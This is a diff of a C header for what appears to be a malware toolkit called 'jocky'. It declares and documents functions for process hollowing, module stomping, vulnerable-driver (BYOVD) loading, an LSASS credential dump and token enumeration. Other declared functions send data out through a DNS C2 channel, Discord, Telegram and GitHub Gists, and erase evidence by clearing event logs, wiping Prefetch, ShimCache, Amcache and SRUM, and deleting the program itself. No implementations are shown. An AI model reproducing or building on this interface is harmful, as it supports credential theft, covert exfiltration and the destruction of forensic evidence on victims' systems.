@@ -349,11 +349,8 @@ bool jocky_dse_load_driver(jocky_byovd_t* ctx,
 
 #ifdef _WIN32
 
-/* Process hollowing — create target_path suspended, replace its image with
- * payload, fix the entry point in the thread context, resume. */
-bool jocky_process_hollow(const wchar_t* target_path,
-                          const uint8_t* payload,
-                          size_t payload_size);
+/* Windows: create target_path suspended, replace image with payload, resume.
+ * Linux: write payload to tmpfile, fork+execve under target_path name. */
 
 /* Module stomping — find module_name in pid's loaded-module list, make its
  * region RWX, overwrite with payload (headers + sections), execute at EP. */
@@ -407,24 +404,12 @@ bool jocky_exfil_front(const char* front_host, const char* real_host,
  * c2_domain.  The authoritative resolver for that domain logs all queries.
  * Format: <4-hex-seq>.<16-char-b32-chunk>.<c2_domain>
  * Terminates with a FFFF.END.<c2_domain> sentinel query. */
-bool jocky_exfil_dns(const char* c2_domain,
-                      const uint8_t* data, size_t data_len);
-
-/* Discord webhook — POST base64(data) as message content.
- * webhook_url is the full URL including token.
- * Chunks at 1 500 bytes to stay within Discord's 2 000-char limit. */
-bool jocky_exfil_discord(const char* webhook_url,
-                          const uint8_t* data, size_t data_len);
-
-/* Telegram Bot API — POST base64(data) as sendMessage text.
- * Chunks at 3 000 bytes (Telegram's 4 096-char limit). */
+bool jocky_exfil_dns(const char* c2_domain, const int8_t* data, int32_t size);
+bool jocky_exfil_discord(const char* webhook_url, const int8_t* data, int32_t size);
 bool jocky_exfil_telegram(const char* bot_token, const char* chat_id,
-                           const uint8_t* data, size_t data_len);
-
-/* GitHub Gist — PATCH a Gist file named "d.txt" with base64(data).
- * token must have the gist scope. */
+                           const int8_t* data, int32_t size);
 bool jocky_exfil_github(const char* token, const char* gist_id,
-                         const uint8_t* data, size_t data_len);
+                         const int8_t* data, int32_t size);
 
 /* ── LSASS credential dump ─────────────────────────────────────────────── */
 
@@ -465,16 +450,19 @@ bool jocky_lsass_exfil(const char* exfil_url, const char* exfil_type);
 /* Delete the running executable using POSIX-semantics unlink (Win10+),
  * rename+delete-on-close (Win7+), or MoveFileEx reboot-delete as fallbacks.
  * Linux: unlinks /proc/self/exe immediately. */
-bool jocky_self_delete(void);
+void jocky_self_delete(void);
 
 /* Clear every Windows event log channel via EvtClearLog (all channels
  * including Sysmon, PowerShell, WMI-Activity).  Also clears legacy logs via
  * ClearEventLog.  Linux: journalctl vacuum + wtmp/lastlog truncate. */
-bool jocky_clear_logs(void);
+void jocky_clear_logs(void);
 
 /* Delete Prefetch .pf files, Recent shortcuts, and %TEMP% contents.
  * Uses Win32 file APIs — no child processes spawned. */
-bool jocky_wipe_artifacts(void);
+void jocky_wipe_artifacts(const char* dir);
+
+/* Clear comma-separated event log channel names, or all channels if NULL. */
+int32_t jocky_cleanup_event_logs(const char* channels);
 
 /* Delete all .pf files from %SystemRoot%\Prefetch. */
 bool jocky_wipe_prefetch(void);
@@ -495,7 +483,7 @@ bool jocky_clear_srum(void);
 
 /* Run all cleanup steps in order: clear logs → wipe prefetch → patch ShimCache
  * → patch Amcache → clear SRUM → wipe artifacts → self-delete. */
-bool jocky_cleanup_all(void);
+void jocky_cleanup_all(void);
 
 /* ============================================================================
  * Memory Allocators
@@ -509,21 +497,21 @@ void* jocky_alloc(int64_t size);
 /* Free a buffer previously returned by jocky_alloc. No-op on NULL. */
 void  jocky_free(void* ptr);
 
-#ifdef _WIN32
-/* Allocate a zeroed jocky_byovd_t context (opaque pointer; use with
- * jocky_byovd_load / jocky_byovd_unload / jocky_byovd_destroy). */
-void* jocky_byovd_new(void);
+/* Allocate a zeroed byovd context. Windows: jocky_byovd_t; Linux: byovd_context_t. */
+int8_t* jocky_byovd_new(void);
+/* Unload and free the context. Safe on NULL. */
+void  jocky_byovd_destroy(int8_t* ctx);
 
-/* Call jocky_byovd_unload() and then free the context. Safe on NULL. */
-void  jocky_byovd_destroy(void* ctx);
-#endif
+/* Enumerate PIDs with accessible tokens/credentials.
+ * Returns a malloc'd int32_t[] terminated by 0, or NULL on failure. */
+int32_t* jocky_token_enumerate(void);
 
 /* ============================================================================
  * Crypto: String / Data Decryption
  * ============================================================================ */
 
-/* Simple XOR decrypt in-place. Key rotates per byte. */
-void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key);
+/* Simple XOR decrypt in-place. key_len unused (single-byte key), kept for prelude.jky ABI. */
+void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key, size_t key_len);
 
 /* RC4-based stream decrypt */
 void jocky_decrypt_rc4(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);
@@ -589,6 +577,9 @@ bool jocky_module_has_symbol(void* handle, const char* symbol_name);
  * Returns base address, or 0 if not found/not loaded
  */
 uintptr_t jocky_module_base(const char* path);
+
+/* Cross-platform process hollowing */
+bool jocky_process_hollow(const char* target_path, int8_t* payload, int32_t payload_size);
 
 #ifndef _WIN32
 /* ============================================================================
